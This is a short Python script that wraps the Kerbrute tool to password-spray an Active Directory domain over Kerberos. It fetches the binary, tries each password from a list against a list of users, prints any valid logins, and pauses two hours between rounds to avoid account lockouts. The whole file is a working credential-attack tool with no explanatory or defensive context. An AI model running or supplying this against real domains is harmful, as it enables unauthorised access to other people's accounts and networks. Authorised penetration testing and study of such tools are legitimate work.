#!/bin/python3

import argparse
import subprocess
import os
import sys
import re
import time
from colorama import Fore, Style

def printBanner():
    print(Fore.YELLOW + """
     dBP dBP     dBBBP    dBBBBBb    dBBBBb  .dBBBBP   dBBBBBb   dBBBBBb  dBBBBBb dBP dBP
    dBP.d8P                   dBP       dBP  BP            dB'       dBP       BB    dBP 
   dBBBBP'     dBBP       dBBBBK    dBBBK'   `BBBBb    dBBBP'    dBBBBK    dBP BB   dBP  
  dBP BB      dBP        dBP  BB   dB' db       dBP   dBP       dBP  BB   dBP  BB  dBP   
 dBP dB'     dBBBBP     dBP  dB'  dBBBBP'  dBBBBP'   dBP       dBP  dB'  dBBBBBBB dBP    
    """ + Style.RESET_ALL)

def downloadKerbrute():
    print(Fore.GREEN + "Checking for Kerbrute...\n" + Style.RESET_ALL)
    kerbrute_filename = 'kerbrute_linux_amd64'
    kerbrute_url = "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/" + kerbrute_filename
    if not os.path.exists(kerbrute_filename):
        print("Downloading Kerbrute...")
        subprocess.run(['wget', '-q', kerbrute_url])  # Quiet mode
        subprocess.run(['chmod', '+x', kerbrute_filename])

def countdownTimer(duration):
    print(Fore.YELLOW + "Cooldown period: Waiting for 2 hours between attempts to avoid lockouts.")
    for remaining in range(duration, 0, -1):
        sys.stdout.write("\r")
        sys.stdout.write("{:2d} seconds remaining.".format(remaining))
        sys.stdout.flush()
        time.sleep(1)
    sys.stdout.write("\rCooldown complete, continuing...\n" + Style.RESET_ALL)

def passwordSpray(domain, passlist, custom_ulist, dc_ip=None):
    with open(passlist, 'r') as file:
        passwords = [line.strip() for line in file]

    for password in passwords:
        print(Fore.GREEN + f"Spraying with password: {password}" + Style.RESET_ALL)
        command = ['./kerbrute_linux_amd64', 'passwordspray', '-d', domain, custom_ulist, password]
        if dc_ip:
            command += ['--dc', dc_ip]
        result = subprocess.run(command, capture_output=True, text=True)

        if "Couldn't find any KDCs for realm" in result.stderr:
            print(Fore.RED + "Error: Couldn't find any KDCs for realm. Check the domain name and DC IP address." + Style.RESET_ALL)
            break

        successful_sprays = re.findall(r'\[\+\] VALID LOGIN: ([^\s]+)', result.stdout)
        for spray in successful_sprays:
            print(Fore.GREEN + f"Successful login: {spray}" + Style.RESET_ALL)

        # Wait for 2 hours to avoid lockouts
        countdownTimer(7200)  # 2 hours in seconds

def main():
    parser = argparse.ArgumentParser(description="Kerbrute Enumeration and Password Spray Script")
    parser.add_argument('-d', '--domain', required=True, help="Target domain")
    parser.add_argument('--dc-ip', help="Domain Controller IP")
    parser.add_argument('--spray', action='store_true', help="Skip enumeration and perform password spray")
    parser.add_argument('--passlist', required='--spray' in sys.argv, help="Password list for spraying")
    parser.add_argument('--custom-ulist', required='--spray' in sys.argv, help="Custom user list for spraying")
    args = parser.parse_args()

    if not args.spray or not args.custom_ulist or not args.passlist:
        parser.print_help()
        sys.exit(1)

    printBanner()
    downloadKerbrute()
    passwordSpray(args.domain, args.passlist, args.custom_ulist, args.dc_ip)

if __name__ == "__main__":
    main()
